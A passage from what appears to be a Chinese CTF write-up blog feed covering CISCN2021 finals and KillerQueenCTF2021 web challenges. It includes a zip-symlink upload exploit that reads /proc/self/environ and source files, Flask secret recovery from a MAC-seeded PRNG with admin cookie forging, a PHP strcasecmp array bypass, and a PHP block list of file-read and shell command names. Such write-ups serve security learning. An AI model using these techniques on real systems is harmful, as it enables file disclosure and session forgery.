&lt;span style="color:#75715e"># os.system(&amp;#39;zip --symlinks exp.zip exp&amp;#39;)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;zip -ry exp.zip exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">makezip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;the_file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 exp.py /proc/self/environ
python3 exp.py /app/y0u_found_it.ini
python3 exp.py /app/y0u_found_it/y0u_found_it_main.py
python3 exp.py /sys/class/net/eth0/address
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
&lt;p>exp.py - 2 æ ¹æ®macåœ°å€ç”Ÿæˆä¼ªéšæœºæ•°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;02:42:0a:00:cb:06&amp;#34;&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">bin&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0b&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 36.014406163923596&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 flask_session_cookie_manager3.py decode -c &lt;span style="color:#d88200">&amp;#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc&amp;#39;&lt;/span>
python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;36.014406163923596&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#34;{u&amp;#39;username&amp;#39;: u&amp;#39;admin&amp;#39;}&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png" alt="image-20211106235751916">&lt;/p>
&lt;p>ç¿»å›å¤´çœ‹æºç ï¼Œå¥½å®¶ä¼™è¿™é‡Œæœ‰å†…é¬¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png" alt="image-20211106235832895">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png" alt="image-20211107075450043">&lt;/p>
&lt;p>è¿”å›çš„å¹¶ä¸æ˜¯çœŸæ­£çš„flagï¼Œè€Œæ˜¯secret.secretä¸­çš„å†…å®¹no flah&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png" alt="image-20211107075326929">&lt;/p>
&lt;p>67è¡Œè¿™é‡Œä¼šå¯¹unzipæ‰“å¼€çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥ï¼Œåªè¦å«æœ‰flagå­—æ ·å°±ä¼šé‡å®šå‘è‡³/?error=1&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™é‡Œæˆ‘æ„Ÿè§‰åŸé¢˜åº”è¯¥secret.pyä¸­çš„&lt;code>secret=&lt;/code>ç›´æ¥å°±èƒ½è¯»å‡ºæ¥flagï¼Œæƒ³äº†å¥½ä¹…ï¼Œå†ç»•ä¸€å±‚flag.txtçš„è¯æˆ‘æ˜¯æƒ³ä¸å‡ºæ¥ä»€ä¹ˆbypassçš„æ–¹æ³•äº†ï¼Œæˆ‘å€¾å‘äºæ˜¯å¸ƒç½®ç¯å¢ƒçš„æ—¶å€™æ²¡æœ‰è®¾ç½®è¿™ä¸€ç‚¹ï¼ˆ&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›easy_python">***[CISCN2021 æ€»å†³èµ›]easy_python&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png" alt="image-20211106212057524">&lt;/p>
&lt;p>ä¸çŸ¥é“æ˜¯æˆ‘çš„ç½‘ç»œé—®é¢˜è¿˜æ˜¯ä»€ä¹ˆæœªçŸ¥çš„bugâ€¦â€¦checkä¹‹åå°±ä¼šå®•æœºï¼Œåªèƒ½é‡æ–°ä¸‹å‘é¶æœº&lt;/p>
&lt;h2 id="ciscn2021-æ€»å†³èµ›ezj4va">***[CISCN2021 æ€»å†³èµ›]ezj4va&lt;/h2>
&lt;p>&lt;a href="https://juejin.cn/post/6997314123918737422">https://juejin.cn/post/6997314123918737422&lt;/a>&lt;/p>
&lt;p>è¿˜ä¸ä¼šjava å…ˆç©ºç€TAT&lt;/p></description></item><item><title>KillerQueenCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</link><pubDate>Sat, 30 Oct 2021 16:39:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</guid><description>&lt;h2 id="webjust-not-my-type">web/Just Not My Type&lt;/h2>
&lt;blockquote>
&lt;p>I really don&amp;rsquo;t think we&amp;rsquo;re compatible (&lt;a href="http://143.198.184.186:7000/">Link&lt;/a>)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$FLAG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;shhhh you don&amp;#39;t get to see this locally&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">strcasecmp&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$FLAG&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$FLAG&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;That&amp;#39;s the wrong password!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬çš„è€æœ‹å‹&lt;code>strcasecmp()&lt;/code>å‡½æ•°ï¼Œå®ƒå’Œ&lt;code>strcmp()&lt;/code>å‡½æ•°ä¸€æ ·ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒºåˆ«æ˜¯åè€…ä¼šåŒºåˆ†å¤§å°å†™ï¼›ç»•è¿‡æ–¹å¼æ˜¯ä¼ å…¥æ•°ç»„ï¼Œè¿™æ ·ä¼šä½¿ä¸¤ä¸ªå‡½æ•°æ— æ³•å¤„ç†è€Œè¿”å›null&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030104447923.png" alt="image-20211030104447923">&lt;/p>
&lt;p>&lt;code>flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}&lt;/code>&lt;/p>
&lt;h2 id="webphat-pottomed-girls">web/PHat Pottomed Girls&lt;/h2>
&lt;blockquote>
&lt;p>Now it&amp;rsquo;s attempt number 3 and this time with a Queen reference! (flag is in the root directory) (&lt;a href="http://143.198.184.186:7001/">Link&lt;/a>)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">generateRandomString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">15&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$characters&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$charactersLength&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$characters&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$randomString&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$randomString&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#111">$characters&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$charactersLength&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$randomString&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$originalstring&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$originalstring&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fopen&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fread&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;file_get_contents&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fgets&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;less&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;more&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;head&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tail&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cut&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;grep&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tac&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;awk&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sed&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;read&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;system&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
